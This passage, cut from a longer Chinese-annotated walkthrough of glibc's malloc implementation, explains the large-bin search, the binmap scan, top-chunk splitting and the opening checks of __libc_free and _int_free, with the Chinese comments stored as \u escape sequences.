( size ) < ( unsigned long ) chunksize_nomask ( bck -> bk )) { // \u4ee4 fwd \u6307\u5411 bin \u5934 fwd = bck ; // \u4ee4 bck \u6307\u5411 bin \u5c3e bck = bck -> bk ; // victim \u7684 fd_nextsize \u6307\u5411\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk victim -> fd_nextsize = fwd -> fd ; // victim \u7684 bk_nextsize \u6307\u5411\u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2achunk \u6307\u5411\u7684bk_nextsize victim -> bk_nextsize = fwd -> fd -> bk_nextsize ; // \u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \u7684 bk_nextsize \u6307\u5411 victim // \u539f\u6765\u6307\u5411\u94fe\u8868\u7b2c\u4e00\u4e2a chunk \u7684 fd_nextsize \u6307\u5411 victim fwd -> fd -> bk_nextsize = victim -> bk_nextsize -> fd_nextsize = victim ; } else { // \u5f53\u524d\u8981\u63d2\u5165\u7684 victim \u7684\u5927\u5c0f\u5927\u4e8e\u6700\u5c0f\u7684 chunk // \u5224\u65ad fwd \u662f\u5426\u5728 main arena assert ( chunk_main_arena ( fwd )); // \u4ece\u94fe\u8868\u5934\u90e8\u5f00\u59cb\u627e\u5230\u4e0d\u6bd4 victim \u5927\u7684 chunk while (( unsigned long ) size < chunksize_nomask ( fwd )) { fwd = fwd -> fd_nextsize ; assert ( chunk_main_arena ( fwd )); } // \u5982\u679c\u627e\u5230\u4e86\u4e00\u4e2a\u548c victim \u4e00\u6837\u5927\u7684 chunk\uff0c // \u90a3\u5c31\u76f4\u63a5\u5c06 chunk \u63d2\u5165\u5230\u8be5chunk\u7684\u540e\u9762\uff0c\u5e76\u4e0d\u4fee\u6539 nextsize \u6307\u9488\u3002 if (( unsigned long ) size == ( unsigned long ) chunksize_nomask ( fwd )) /* Always insert in the second position. */ fwd = fwd -> fd ; else { // \u5982\u679c\u627e\u5230\u7684chunk\u548c\u5f53\u524dvictim\u5927\u5c0f\u4e0d\u4e00\u6837 // \u90a3\u4e48\u5c31\u9700\u8981\u6784\u9020 nextsize \u53cc\u5411\u94fe\u8868\u4e86 victim -> fd_nextsize = fwd ; victim -> bk_nextsize = fwd -> bk_nextsize ; fwd -> bk_nextsize = victim ; victim -> bk_nextsize -> fd_nextsize = victim ; } bck = fwd -> bk ; } } else // \u5982\u679c\u7a7a\u7684\u8bdd\uff0c\u76f4\u63a5\u7b80\u5355\u4f7f\u5f97 fd_nextsize \u4e0e bk_nextsize \u6784\u6210\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u5373\u53ef\u3002 victim -> fd_nextsize = victim -> bk_nextsize = victim ; } \u6700\u7ec8\u53d6\u51fa \u00b6 // \u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\uff0c\u6784\u6210 bk<-->victim<-->fwd\u3002 mark_bin ( av , victim_index ); victim -> bk = bck ; victim -> fd = fwd ; fwd -> bk = victim ; bck -> fd = victim ; while \u8fed\u4ee3\u6b21\u6570 \u00b6 while \u6700\u591a\u8fed\u4ee310000\u6b21\u540e\u9000\u51fa\u3002 // ##define MAX_ITERS 10000 if ( ++ iters >= MAX_ITERS ) break ; } large chunk \u00b6 \u6ce8\uff1a \u6216\u8bb8\u4f1a\u5f88\u5947\u602a\uff0c\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u6ca1\u6709\u5148\u53bb\u770b small chunk \u662f\u5426\u6ee1\u8db3\u65b0\u9700\u6c42\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3asmall bin \u5728\u5faa\u73af\u4e4b\u524d\u5df2\u7ecf\u5224\u65ad\u8fc7\u4e86\uff0c\u8fd9\u91cc\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u662f\u5408\u5e76\u540e\u7684\u624d\u51fa\u73b0chunk\u3002\u4f46\u662f\u5728\u5927\u5faa\u73af\u5916\uff0clarge chunk \u53ea\u662f\u5355\u7eaf\u5730\u627e\u5230\u5176\u7d22\u5f15\uff0c\u6240\u4ee5\u89c9\u5f97\u5728\u8fd9\u91cc\u76f4\u63a5\u5148\u5224\u65ad\u662f\u5408\u7406\u7684\uff0c\u800c\u4e14\u4e5f\u4e3a\u4e86\u4e0b\u9762\u53ef\u4ee5\u518d\u53bb\u627e\u8f83\u5927\u7684chunk\u3002 \u5982\u679c\u8bf7\u6c42\u7684 chunk \u5728 large chunk \u8303\u56f4\u5185\uff0c\u5c31\u5728\u5bf9\u5e94\u7684 bin \u4e2d\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u626b\u63cf\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u5408\u9002\u7684\u3002 /* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ if ( ! in_smallbin_range ( nb )) { bin = bin_at ( av , idx ); /* skip scan if empty or largest chunk is too small */ // \u5982\u679c\u5bf9\u5e94\u7684 bin \u4e3a\u7a7a\u6216\u8005\u5176\u4e2d\u7684chunk\u6700\u5927\u7684\u4e5f\u5f88\u5c0f\uff0c\u90a3\u5c31\u8df3\u8fc7 // first(bin)=bin->fd \u8868\u793a\u5f53\u524d\u94fe\u8868\u4e2d\u6700\u5927\u7684chunk if (( victim = first ( bin )) != bin && ( unsigned long ) chunksize_nomask ( victim ) >= ( unsigned long ) ( nb )) { // \u53cd\u5411\u904d\u5386\u94fe\u8868\uff0c\u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u4e0d\u5c0f\u4e8e\u6240\u9700chunk\u5927\u5c0f\u7684chunk victim = victim -> bk_nextsize ; while ((( unsigned long ) ( size = chunksize ( victim )) < ( unsigned long ) ( nb ))) victim = victim -> bk_nextsize ; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ // \u5982\u679c\u6700\u7ec8\u53d6\u5230\u7684chunk\u4e0d\u662f\u8be5bin\u4e2d\u7684\u6700\u540e\u4e00\u4e2achunk\uff0c\u5e76\u4e14\u8be5chunk\u4e0e\u5176\u524d\u9762\u7684chunk // \u7684\u5927\u5c0f\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53d6\u5176\u524d\u9762\u7684chunk\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u8c03\u6574bk_nextsize,fd_nextsize // \u94fe\u8868\u3002\u56e0\u4e3a\u5927\u5c0f\u76f8\u540c\u7684chunk\u53ea\u6709\u4e00\u4e2a\u4f1a\u88ab\u4e32\u5728nextsize\u94fe\u4e0a\u3002 if ( victim != last ( bin ) && chunksize_nomask ( victim ) == chunksize_nomask ( victim -> fd )) victim = victim -> fd ; // \u8ba1\u7b97\u5206\u914d\u540e\u5269\u4f59\u7684\u5927\u5c0f remainder_size = size - nb ; // \u8fdb\u884cunlink unlink ( av , victim , bck , fwd ); /* Exhaust */ // \u5269\u4e0b\u7684\u5927\u5c0f\u4e0d\u8db3\u4ee5\u5f53\u505a\u4e00\u4e2a\u5757 // \u5f88\u597d\u5947\u63a5\u4e0b\u6765\u4f1a\u600e\u4e48\u529e\uff1f if ( remainder_size < MINSIZE ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); } /* Split */ // \u5269\u4e0b\u7684\u5927\u5c0f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2achunk\uff0c\u8fdb\u884c\u5206\u5272\u3002 else { // \u83b7\u53d6\u5269\u4e0b\u90a3\u90e8\u5206chunk\u7684\u6307\u9488\uff0c\u79f0\u4e3aremainder remainder = chunk_at_offset ( victim , nb ); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // \u63d2\u5165unsorted bin\u4e2d bck = unsorted_chunks ( av ); fwd = bck -> fd ; // \u5224\u65ad unsorted bin \u662f\u5426\u88ab\u7834\u574f\u3002 if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"malloc(): corrupted unsorted chunks\" ; goto errout ; } remainder -> bk = bck ; remainder -> fd = fwd ; bck -> fd = remainder ; fwd -> bk = remainder ; // \u5982\u679c\u4e0d\u5904\u4e8esmall bin\u8303\u56f4\u5185\uff0c\u5c31\u8bbe\u7f6e\u5bf9\u5e94\u7684\u5b57\u6bb5 if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // \u8bbe\u7f6e\u5206\u914d\u7684chunk\u7684\u6807\u8bb0 set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); // \u8bbe\u7f6eremainder\u7684\u4e0a\u4e00\u4e2achunk\uff0c\u5373\u5206\u914d\u51fa\u53bb\u7684chunk\u7684\u4f7f\u7528\u72b6\u6001 // \u5176\u4f59\u7684\u4e0d\u7528\u7ba1\uff0c\u76f4\u63a5\u4ece\u4e0a\u9762\u7ee7\u627f\u4e0b\u6765\u4e86 set_head ( remainder , remainder_size | PREV_INUSE ); // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f set_foot ( remainder , remainder_size ); } // \u68c0\u67e5 check_malloced_chunk ( av , victim , nb ); // \u8f6c\u6362\u4e3amem\u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } \u5bfb\u627e\u8f83\u5927 chunk \u00b6 \u5982\u679c\u8d70\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u8bf4\u660e\u5bf9\u4e8e\u7528\u6237\u6240\u9700\u7684chunk\uff0c\u4e0d\u80fd\u76f4\u63a5\u4ece\u5176\u5bf9\u5e94\u7684\u5408\u9002\u7684bin\u4e2d\u83b7\u53d6chunk\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6765\u67e5\u627e\u6bd4\u5f53\u524d bin \u66f4\u5927\u7684 fast bin \uff0c small bin \u6216\u8005 large bin\u3002 /* Search for a chunk by scanning bins, starting with next largest bin. This search is strictly by best-fit; i.e., the smallest (with ties going to approximately the least recently used) chunk that fits is selected. The bitmap avoids needing to check that most blocks are nonempty. The particular case of skipping all bins during warm-up phases when no chunks have been returned yet is faster than it might look. */ ++ idx ; // \u83b7\u53d6\u5bf9\u5e94\u7684bin bin = bin_at ( av , idx ); // \u83b7\u53d6\u5f53\u524d\u7d22\u5f15\u5728binmap\u4e2d\u7684block\u7d22\u5f15 // #define idx2block(i) ((i) >> BINMAPSHIFT) ,BINMAPSHIFT=5 // Binmap\u6309block\u7ba1\u7406\uff0c\u6bcf\u4e2ablock\u4e3a\u4e00\u4e2aint\uff0c\u517132\u4e2abit\uff0c\u53ef\u4ee5\u8868\u793a32\u4e2abin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2chunk\u5b58\u5728 // \u6240\u4ee5\u8fd9\u91cc\u662f\u53f3\u79fb5 block = idx2block ( idx ); // \u83b7\u53d6\u5f53\u524d\u5757\u5927\u5c0f\u5bf9\u5e94\u7684\u6620\u5c04\uff0c\u8fd9\u91cc\u53ef\u4ee5\u5f97\u77e5\u76f8\u5e94\u7684bin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2\u5757 map = av -> binmap [ block ]; // #define idx2bit(i) ((1U << ((i) & ((1U << BINMAPSHIFT) - 1)))) // \u5c06idx\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u8bbe\u7f6e\u4e3a1\uff0c\u5176\u5b83\u4f4d\u4e3a0 bit = idx2bit ( idx ); for (;;) { \u627e\u5230\u4e00\u4e2a\u5408\u9002\u7684 map \u00b6 /* Skip rest of block if there are no more set bits in this block. */ // \u5982\u679cbit>map\uff0c\u5219\u8868\u793a\u8be5 map \u4e2d\u6ca1\u6709\u6bd4\u5f53\u524d\u6240\u9700\u8981chunk\u5927\u7684\u7a7a\u95f2\u5757 // \u5982\u679cbit\u4e3a0\uff0c\u90a3\u4e48\u8bf4\u660e\uff0c\u4e0a\u9762idx2bit\u5e26\u5165\u7684\u53c2\u6570\u4e3a0\u3002 if ( bit > map || bit == 0 ) { do { // \u5bfb\u627e\u4e0b\u4e00\u4e2ablock\uff0c\u76f4\u5230\u5176\u5bf9\u5e94\u7684map\u4e0d\u4e3a0\u3002 // \u5982\u679c\u5df2\u7ecf\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u90a3\u5c31\u53ea\u80fd\u4f7f\u7528top chunk\u4e86 if ( ++ block >= BINMAPSIZE ) /* out of bins */ goto use_top ; } while (( map = av -> binmap [ block ]) == 0 ); // \u83b7\u53d6\u5176\u5bf9\u5e94\u7684bin\uff0c\u56e0\u4e3a\u8be5map\u4e2d\u7684chunk\u5927\u5c0f\u90fd\u6bd4\u6240\u9700\u7684chunk\u5927\uff0c\u800c\u4e14 // map\u672c\u8eab\u4e0d\u4e3a0\uff0c\u6240\u4ee5\u5fc5\u7136\u5b58\u5728\u6ee1\u8db3\u9700\u6c42\u7684chunk\u3002 bin = bin_at ( av , ( block << BINMAPSHIFT )); bit = 1 ; } \u627e\u5230\u5408\u9002\u7684 bin \u00b6 /* Advance to bin with set bit. There must be one. */ // \u4ece\u5f53\u524dmap\u7684\u6700\u5c0f\u7684bin\u4e00\u76f4\u627e\uff0c\u76f4\u5230\u627e\u5230\u5408\u9002\u7684bin\u3002 // \u8fd9\u91cc\u662f\u4e00\u5b9a\u5b58\u5728\u7684 while (( bit & map ) == 0 ) { bin = next_bin ( bin ); bit <<= 1 ; assert ( bit != 0 ); } \u7b80\u5355\u68c0\u67e5 chunk \u00b6 /* Inspect the bin. It is likely to be non-empty */ // \u83b7\u53d6\u5bf9\u5e94\u7684bin victim = last ( bin ); /* If a false alarm (empty bin), clear the bit. */ // \u5982\u679cvictim=bin\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5c06map\u5bf9\u5e94\u7684\u4f4d\u6e050\uff0c\u7136\u540e\u83b7\u53d6\u4e0b\u4e00\u4e2abin // \u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u7684\u6982\u7387\u5e94\u8be5\u5f88\u5c0f\u3002 if ( victim == bin ) { av -> binmap [ block ] = map &= ~ bit ; /* Write through */ bin = next_bin ( bin ); bit <<= 1 ; } \u771f\u6b63\u53d6\u51fachunk \u00b6 else { // \u83b7\u53d6\u5bf9\u5e94victim\u7684\u5927\u5c0f size = chunksize ( victim ); /* We know the first chunk in this bin is big enough to use. */ assert (( unsigned long ) ( size ) >= ( unsigned long ) ( nb )); // \u8ba1\u7b97\u5206\u5272\u540e\u5269\u4f59\u7684\u5927\u5c0f remainder_size = size - nb ; /* unlink */ unlink ( av , victim , bck , fwd ); /* Exhaust */ // \u5982\u679c\u5206\u5272\u540e\u4e0d\u591f\u4e00\u4e2achunk\u600e\u4e48\u529e\uff1f if ( remainder_size < MINSIZE ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); } /* Split */ // \u5982\u679c\u591f\uff0c\u5c3d\u7ba1\u5206\u5272 else { // \u8ba1\u7b97\u5269\u4f59\u7684chunk\u7684\u504f\u79fb remainder = chunk_at_offset ( victim , nb ); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // \u5c06\u5269\u4f59\u7684chunk\u63d2\u5165\u5230unsorted bin\u4e2d bck = unsorted_chunks ( av ); fwd = bck -> fd ; if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"malloc(): corrupted unsorted chunks 2\" ; goto errout ; } remainder -> bk = bck ; remainder -> fd = fwd ; bck -> fd = remainder ; fwd -> bk = remainder ; /* advertise as last remainder */ // \u5982\u679c\u5728small bin\u8303\u56f4\u5185\uff0c\u5c31\u5c06\u5176\u6807\u8bb0\u4e3aremainder if ( in_smallbin_range ( nb )) av -> last_remainder = remainder ; if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // \u8bbe\u7f6evictim\u7684\u4f7f\u7528\u72b6\u6001 set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); // \u8bbe\u7f6eremainder\u7684\u4f7f\u7528\u72b6\u6001\uff0c\u8fd9\u91cc\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f set_head ( remainder , remainder_size | PREV_INUSE ); // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f set_foot ( remainder , remainder_size ); } // \u68c0\u67e5 check_malloced_chunk ( av , victim , nb ); // chunk\u72b6\u6001\u8f6c\u6362\u5230mem\u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } \u4f7f\u7528 top chunk \u00b6 \u5982\u679c\u6240\u6709\u7684 bin \u4e2d\u7684 chunk \u90fd\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u6ee1\u8db3\u8981\u6c42\uff08\u5373\u4e0d\u5408\u5e76\uff09\uff0c\u6216\u8005\u8bf4\u90fd\u6ca1\u6709\u7a7a\u95f2\u7684 chunk\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u53ea\u80fd\u4f7f\u7528 top chunk \u4e86\u3002 use_top : /* If large enough, split off the chunk bordering the end of memory (held in av->top). Note that this is in accord with the best-fit search rule. In effect, av->top is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av->top always exists (i.e., has size >= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ // \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f victim = av -> top ; size = chunksize ( victim ); // \u5982\u679c\u5206\u5272\u4e4b\u540e\uff0ctop chunk \u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002 if (( unsigned long ) ( size ) >= ( unsigned long ) ( nb + MINSIZE )) { remainder_size = size - nb ; remainder = chunk_at_offset ( victim , nb ); av -> top = remainder ; // \u8fd9\u91cc\u8bbe\u7f6e PREV_INUSE \u662f\u56e0\u4e3a top chunk \u7684 chunk \u5982\u679c\u4e0d\u662f fastbin\uff0c\u5c31\u5fc5\u7136\u4f1a\u548c // top chunk \u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u8bbe\u7f6e\u4e86 PREV_INUSE\u3002 set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); check_malloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } // \u5426\u5219\uff0c\u5224\u65ad\u662f\u5426\u6709 fast chunk /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if ( have_fastchunks ( av )) { // \u5148\u6267\u884c\u4e00\u6b21fast bin\u7684\u5408\u5e76 malloc_consolidate ( av ); /* restore original bin index */ // \u5224\u65ad\u9700\u8981\u7684chunk\u662f\u5728small bin\u8303\u56f4\u5185\u8fd8\u662flarge bin\u8303\u56f4\u5185 // \u5e76\u8ba1\u7b97\u5bf9\u5e94\u7684\u7d22\u5f15 // \u7b49\u5f85\u4e0b\u6b21\u518d\u770b\u770b\u662f\u5426\u53ef\u4ee5 if ( in_smallbin_range ( nb )) idx = smallbin_index ( nb ); else idx = largebin_index ( nb ); } /* Otherwise, relay to handle system-dependent cases */ // \u5426\u5219\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ea\u80fd\u4ece\u7cfb\u7edf\u4e2d\u518d\u6b21\u7533\u8bf7\u4e00\u70b9\u5185\u5b58\u4e86\u3002 else { void * p = sysmalloc ( nb , av ); if ( p != NULL ) alloc_perturb ( p , bytes ); return p ; } _libc_calloc \u00b6 calloc \u4e5f\u662f libc \u4e2d\u7684\u4e00\u79cd\u7533\u8bf7\u5185\u5b58\u5757\u7684\u51fd\u6570\u3002\u5728 libc \u4e2d\u7684\u5305\u88c5\u4e3a _libc_calloc \uff0c\u5177\u4f53\u4ecb\u7ecd\u5982\u4e0b /* calloc(size_t n_elements, size_t element_size); Returns a pointer to n_elements * element_size bytes, with all locations set to zero. */ void * __libc_calloc ( size_t , size_t ); sysmalloc \u00b6 \u6709\u65f6\u95f4\u7684\u65f6\u5019\u518d\u5206\u6790\u3002 \u91ca\u653e\u5185\u5b58\u5757 \u00b6 __libc_free \u00b6 \u7c7b\u4f3c\u4e8e malloc\uff0cfree \u51fd\u6570\u4e5f\u6709\u4e00\u5c42\u5c01\u88c5\uff0c\u547d\u540d\u683c\u5f0f\u4e0e malloc \u57fa\u672c\u7c7b\u4f3c\u3002\u4ee3\u7801\u5982\u4e0b void __libc_free ( void * mem ) { mstate ar_ptr ; mchunkptr p ; /* chunk corresponding to mem */ // \u5224\u65ad\u662f\u5426\u6709\u94a9\u5b50\u51fd\u6570 __free_hook void ( * hook )( void * , const void * ) = atomic_forced_read ( __free_hook ); if ( __builtin_expect ( hook != NULL , 0 )) { ( * hook )( mem , RETURN_ADDRESS ( 0 )); return ; } // free NULL\u6ca1\u6709\u4f5c\u7528 if ( mem == 0 ) /* free(0) has no effect */ return ; // \u5c06mem\u8f6c\u6362\u4e3achunk\u72b6\u6001 p = mem2chunk ( mem ); // \u5982\u679c\u8be5\u5757\u5185\u5b58\u662fmmap\u5f97\u5230\u7684 if ( chunk_is_mmapped ( p )) /* release mmapped memory. */ { /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if ( ! mp_ . no_dyn_threshold && chunksize_nomask ( p ) > mp_ . mmap_threshold && chunksize_nomask ( p ) <= DEFAULT_MMAP_THRESHOLD_MAX && ! DUMPED_MAIN_ARENA_CHUNK ( p )) { mp_ . mmap_threshold = chunksize ( p ); mp_ . trim_threshold = 2 * mp_ . mmap_threshold ; LIBC_PROBE ( memory_mallopt_free_dyn_thresholds , 2 , mp_ . mmap_threshold , mp_ . trim_threshold ); } munmap_chunk ( p ); return ; } // \u6839\u636echunk\u83b7\u5f97\u5206\u914d\u533a\u7684\u6307\u9488 ar_ptr = arena_for_chunk ( p ); // \u6267\u884c\u91ca\u653e _int_free ( ar_ptr , p , 0 ); } _int_free \u00b6 \u51fd\u6570\u521d\u59cb\u65f6\u523b\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u7684\u53d8\u91cf\uff0c\u5e76\u4e14\u5f97\u5230\u4e86\u7528\u6237\u60f3\u8981\u91ca\u653e\u7684 chunk \u7684\u5927\u5c0f static void _int_free ( mstate av , mchunkptr p , int have_lock ) { INTERNAL_SIZE_T size ; /* its size */ mfastbinptr * fb ; /* associated fastbin */ mchunkptr nextchunk ; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize ; /* its size */ int nextinuse ; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize ; /* size of previous contiguous chunk */ mchunkptr bck ; /* misc temp for linking */ mchunkptr fwd ; /* misc temp for linking */ const char * errstr = NULL ; int locked = 0 ; size = chunksize ( p ); \u7b80\u5355\u7684\u68c0\u67e5 \u00b6 /* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \"design\" from some intruder. */ // \u6307\u9488\u4e0d\u80fd\u6307\u5411\u975e\u6cd5\u7684\u5730\u5740, \u5fc5\u987b\u5c0f\u4e8e\u7b49\u4e8e-size\uff0c\u4e3a\u4ec0\u4e48\uff1f\uff1f\uff1f // \u6307\u9488\u5fc5\u987b\u5f97\u5bf9\u9f50\uff0c2*SIZE_SZ \u8fd9\u4e2a\u5bf9\u9f50\u5f97\u4ed4\u7ec6\u60f3\u60f3 if ( __builtin_expect (( uintptr_t ) p > ( uintptr_t ) - size , 0 ) || __builtin_expect ( misaligned_chunk ( p ), 0 )) { errstr = \"free(): invalid pointer\" ; errout : if ( ! have_lock && locked ) __libc_lock_unlock ( av -> mutex ); malloc_printerr ( check_action , errstr , chunk2mem ( p ), av ); return ; } /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ // \u5927\u5c0f\u6ca1\u6709\u6700\u5c0f\u7684chunk\u5927\uff0c\u6216\u8005\u8bf4\uff0c\u5927\u5c0f\u4e0d\u662fMALLOC_ALIGNMENT\u7684\u6574\u6570\u500d if ( __glibc_unlikely ( size < MINSIZE || ! aligned_OK ( size ))) { errstr = \"free(): invalid size\" ; goto errout ; } // \u68c0\u67e5\u8be5chunk\u662f\u5426\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_inuse_chunk ( av , p ); \u5176\u4e2d /* Check if m has acceptable alignment */ #define aligned_OK(m) (((unsigned long) (m) &MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) & \\ MALLOC_ALIGN_MASK) fast bin \u00b6 \u5982\u679c\u4e0a\u8ff0\u68c0\u67e5\u90fd\u5408\u683c\u7684\u8bdd\uff0c\u5224\u65ad\u5f53\u524d\u7684 bin \u662f\u4e0d\u662f\u5728 fast bin \u8303\u56f4\u5185\uff0c\u5728\u7684\u8bdd\u5c31\u63d2\u5165\u5230 fastbin \u5934\u90e8 \uff0c\u5373\u6210\u4e3a\u5bf9\u5e94 fastbin \u94fe\u8868\u7684 \u7b2c\u4e00\u4e2a free chunk \u3002 /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if (( unsigned long ) ( size ) <= ( unsigned long ) ( get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ //\u9ed8\u8ba4 #define TRIM_FASTBINS 0\uff0c\u56e0\u6b64\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0b\u9762\u7684\u8bed\u53e5\u4e0d\u4f1a\u6267\u884c // \u5982\u679c\u5f53\u524dchunk\u662ffast chunk\uff0c\u5e76\u4e14\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u5219\u4e0d\u80fd\u63d2\u5165 && ( chunk_at_offset ( p , size ) != av -> top ) #endif ) { // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e\u4e24\u500d\u7684SIZE_SZ,\u5e76\u4e14 // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5927\u4e8esystem_mem\uff0c \u4e00\u822c\u4e3a132k // \u5982\u679c\u51fa\u73b0\u8fd9\u6837\u7684\u60c5\u51b5\uff0c\u5c31\u62a5\u9519\u3002 if ( __builtin_expect ( chunksize_nomask ( chunk_at_offset ( p , size )) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize ( chunk_at_offset ( p , size )) >= av -> system_mem , 0 )) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if ( have_lock || ({ assert ( locked == 0 ); __libc_lock_lock ( av -> mutex ); locked = 1 ; chunksize_nomask ( chunk_at_offset ( p , size )) <= 2 * SIZE_SZ || chunksize ( chunk_at_offset ( p , size )) >= av -> system_mem ; })) { errstr = \"free(): invalid next size (fast)\" ; goto errout ; } if ( ! have_lock ) { __libc_lock_unlock ( av -> mutex ); locked = 0 ; } } // \u5c06chunk\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte free_perturb ( chunk2mem ( p ), size - 2 * SIZE_SZ ); // \u8bbe\u7f6efast chunk\u7684\u6807\u8bb0\u4f4d set_fastchunks ( av ); // \u6839\u636e\u5927\u5c0f\u83b7\u53d6fast bin\u7684\u7d22\u5f15 unsigned int idx = fastbin_index ( size ); // \u83b7\u53d6\u5bf9\u5e94fastbin\u7684\u5934\u6307\u9488\uff0c\u88ab\u521d\u59cb\u5316\u540e\u4e3aNULL\u3002 fb = & fastbin ( av , idx ); /* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ // \u4f7f\u7528\u539f\u5b50\u64cd\u4f5c\u5c06P\u63d2\u5165\u5230\u94fe\u8868\u4e2d mchunkptr old = * fb , old2 ; unsigned int old_idx = ~ 0u ; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ // so we can not double free one fastbin chunk // \u9632\u6b62\u5bf9 fast bin double free if ( __builtin_expect ( old == p , 0 )) { errstr = \"double free or corruption (fasttop)\" ; goto errout ; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if ( have_lock && old != NULL ) old_idx = fastbin_index ( chunksize ( old )); p -> fd = old2 = old ; } while (( old = catomic_compare_and_exchange_val_rel ( fb , p , old2 )) != old2 ); // \u786e\u4fddfast bin\u7684\u52a0\u5165\u524d\u4e0e\u52a0\u5165\u540e\u76f8\u540c if ( have_lock && old != NULL && __builtin_expect ( old_idx != idx , 0 )) { errstr = \"invalid fastbin entry (free)\" ; goto errout ; } } \u5408\u5e76\u975e mmap \u7684\u7a7a\u95f2 chunk \u00b6 \u53ea\u6709\u4e0d\u662f fast bin 